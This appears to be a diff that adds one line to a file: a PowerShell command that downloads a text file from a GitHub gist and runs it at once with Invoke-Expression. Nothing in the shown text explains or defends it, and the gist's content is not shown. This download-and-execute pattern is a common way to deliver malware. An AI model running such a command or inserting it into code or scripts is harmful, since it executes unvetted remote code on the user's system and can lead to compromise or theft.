@@ -1,0 +1,1 @@
+Invoke-Expression (New-Object Net.WebClient).DownloadString("https://gist.githubusercontent.com/kopch02/a98fe2107e7897672d05a1bd25b20e8a/raw/db20c35604328549722bd8f068c06a3135a47874/gistfile1.txt")
